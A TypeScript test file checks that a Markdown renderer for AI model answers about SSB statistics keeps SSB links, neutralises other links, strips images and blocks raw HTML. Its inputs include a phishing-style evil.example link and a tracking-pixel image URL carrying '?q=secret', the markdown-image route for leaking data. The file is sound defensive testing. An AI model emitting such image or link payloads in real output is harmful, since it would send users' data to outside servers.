import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";

import { Markdown } from "./markdown";

function render(markdown: string) {
  return renderToStaticMarkup(<Markdown>{markdown}</Markdown>);
}

describe("Markdown", () => {
  it("renders bold text and tables", () => {
    const html = render(
      "**Oslo had 728,714 inhabitants.**\n\n| Year | Population |\n|---|---|\n| 2026 | 728,714 |",
    );

    expect(html).toContain('data-streamdown="strong"');
    expect(html).toContain("<table");
    expect(html).toContain("728,714");
  });

  it("keeps links to SSB, including bare URLs", () => {
    const html = render(
      "Source: table 11342 (https://www.ssb.no/en/statbank/table/11342)",
    );

    expect(html).toContain('href="https://www.ssb.no/en/statbank/table/11342"');
  });

  it("turns links to other sites into plain text", () => {
    const html = render("[Click here](https://evil.example/login)");

    expect(html).not.toContain("evil.example");
    expect(html).toContain("Click here");
  });

  it("removes images so they can't leak data to other servers", () => {
    const html = render("![chart](https://evil.example/pixel.png?q=secret)");

    expect(html).not.toContain("<img");
    expect(html).not.toContain("evil.example");
  });

  it("does not render raw HTML from the model", () => {
    const html = render('<img src="https://evil.example/x.png">');

    expect(html).not.toContain("<img");
  });
});
